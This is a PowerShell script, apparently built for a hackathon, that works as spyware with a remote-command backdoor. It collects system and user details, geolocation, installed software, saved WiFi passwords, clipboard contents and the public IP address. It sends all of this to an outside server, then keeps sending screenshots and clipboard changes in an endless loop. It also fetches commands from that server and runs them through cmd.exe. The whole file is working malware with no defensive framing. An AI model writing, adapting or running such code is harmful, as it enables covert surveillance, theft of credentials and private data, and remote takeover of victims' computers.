if (-not (Test-Connection 8.8.8.8 -Quiet)) {exit}

# Get UUID
$uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID

# Current User
$cu = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$info = Get-ComputerInfo
$email = $info.CsPrimaryOwnerName
$ver = $info.OsName
$model = $info.CsManufacturer + " " + $info.CsModel

# GPU
$gpu = Get-WmiObject win32_VideoController | Select VideoProcessor,VideoModeDescription,MaxRefreshRate

# Location
Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
$GeoWatcher.Start() #Begin resolving current locaton

while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
    Start-Sleep -Milliseconds 100 #Wait for discovery.
}  

if ($GeoWatcher.Permission -eq 'Denied'){
    $latlon = "No permission"
} else {
    $latlon = $GeoWatcher.Position.Location | Select Latitude,Longitude
}

# Installed Programs
$InstalledSoftware = Get-ChildItem "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall"
foreach($obj in $InstalledSoftware){write-host $obj.GetValue('DisplayName')}

# Systeminfo
$sysinfo = systeminfo
$ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb
$cpu = (Get-WmiObject Win32_Processor | Select Name).Name
$tz = (Get-TimeZone).DisplayName

# Get WiFi passwords (http://woshub.com/view-saved-wi-fi-passwords-windows/)
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table –Wrap

$time = Get-Date -UFormat %s
$clip = Get-Clipboard
$ip = (Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content)).ip

# Send the data!
$data = [PSCustomObject]@{
    TYPE = "info"

    UUID = $uuid
    Time = $time
    CurrentUser = $cu
    Email = $email
    OS = $ver
    Model = $model

    Clipboard = $clip
    RAM = $ram
    CPU = $cpu
    GPU = $gpu.VideoProcessor -join ", "
    TimeZone = $tz
    Location = $latlon.Latitude.ToString() + ", " + $latlon.Longitude
    IP = $ip
}

$json = $data | ConvertTo-Json -Compress
$json

$url = "https://spea.cc/hackathon/stuff.php"
$web = Invoke-WebRequest -Uri $url -Method Post -Body $json -ContentType 'application/json; charset=UTF-8' -UseBasicParsing
$web

[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
function screenshot($path)
{
    $width = 0;
    $height = 0;
    $workingAreaX = 0;
    $workingAreaY = 0;

    $screen = [System.Windows.Forms.Screen]::AllScreens;

    foreach ($item in $screen)
    {
        if($workingAreaX -gt $item.WorkingArea.X)
        {
            $workingAreaX = $item.WorkingArea.X;
        }

        if($workingAreaY -gt $item.WorkingArea.Y)
        {
            $workingAreaY = $item.WorkingArea.Y;
        }

        $width = $width + $item.Bounds.Width;

        if($item.Bounds.Height -gt $height)
        {
            $height = $item.Bounds.Height;
        }
    }

    $bounds = [Drawing.Rectangle]::FromLTRB($workingAreaX, $workingAreaY, $width, $height);
    $bmp = New-Object Drawing.Bitmap $width, $height;
    $graphics = [Drawing.Graphics]::FromImage($bmp);

    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);

    $bmp.Save($path);

    $graphics.Dispose();
    $bmp.Dispose();
}


$clipboard = $null
$counter = 0

while ($true) {
    if ($counter -eq 4) {
        $path = "screenshot.png"
        screenshot $path
        $out = [convert]::ToBase64String((get-content $path -encoding byte))

        $data = [PSCustomObject]@{
            TYPE = "image"
            UUID = $uuid
            IMG = $out
        }
        $json = $data | ConvertTo-Json -Compress

        $web = Invoke-WebRequest -Uri $url -Method Post -Body $json -ContentType 'application/json; charset=UTF-8' -UseBasicParsing
        $web

        $counter = 0
    }
    $counter++

    ## CLIPBOARD

    if (-not (((Get-Clipboard) -join "\n") -eq $clipboard)) {
        $clipboard = (Get-Clipboard) -join "\n"
        $clipboard

        $data = [PSCustomObject]@{
            TYPE = "clipboard"
            UUID = $uuid
            Clipboard = $clipboard
        }
        $json = $data | ConvertTo-Json -Compress
        $json

        $web = Invoke-WebRequest -Uri $url -Method Post -Body $json -ContentType 'application/json; charset=UTF-8' -UseBasicParsing
        $web
    }

    ## COMMAND

    ## GET 
    $data = [PSCustomObject]@{
        UUID = $uuid
    }
    $json = $data | ConvertTo-Json -Compress
    $json

    $url = 'https://spea.cc/hackathon/getcommand.php'

    $scriptBlock = {
        param ($cmd)
        cmd.exe /c $cmd
        ## Other stuff here
    }

    $web = Invoke-WebRequest -Uri $url -Method Post -Body $json -ContentType 'application/json; charset=UTF-8' -UseBasicParsing

    if (-not ($time -eq ($web.Content).Split("|||")[0])) {
        $time = ($web.Content).Split("|||")[0]
        Start-Job -ScriptBlock $scriptBlock -ArgumentList @(($web.Content).Split("|||")[-1])
    }

    Sleep 1
}